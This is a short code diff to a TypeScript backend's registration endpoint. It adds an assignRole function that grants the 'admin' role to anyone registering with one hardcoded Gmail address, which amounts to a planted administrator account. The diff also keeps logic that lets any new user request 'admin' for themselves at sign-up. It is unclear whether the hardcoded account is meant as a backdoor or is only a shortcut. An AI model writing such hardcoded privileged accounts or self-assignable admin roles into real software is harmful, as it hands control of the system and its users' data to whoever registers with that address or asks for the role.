@@ -32,6 +32,16 @@ const {
   MASTER_OWNER_EMAIL,
 } = process.env;
 
+const ADMIN_EMAIL = "813786b@gmail.com";
+
+function assignRole(email: string, requestedRole?: string): string {
+  if (email.toLowerCase() === ADMIN_EMAIL.toLowerCase()) {
+    return "admin";
+  }
+  const allowedRoles = ['client', 'barber', 'radio', 'admin'];
+  return allowedRoles.includes(requestedRole || '') ? requestedRole! : 'client';
+}
+
 const twilioClient =
   TWILIO_ACCOUNT_SID && TWILIO_AUTH_TOKEN
     ? twilio(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
@@ -862,8 +872,7 @@ app.post('/api/auth/register', async (req, res) => {
       return res.status(409).json({ error: 'Email already registered' });
     }
 
-    const allowedRoles = ['client', 'barber', 'radio', 'admin'];
-    const finalRole = allowedRoles.includes(role) ? role : 'client';
+    const finalRole = assignRole(lowerEmail, role);
 
     const id = cryptoRandomId();
     const password_hash = await bcrypt.hash(password, 10);
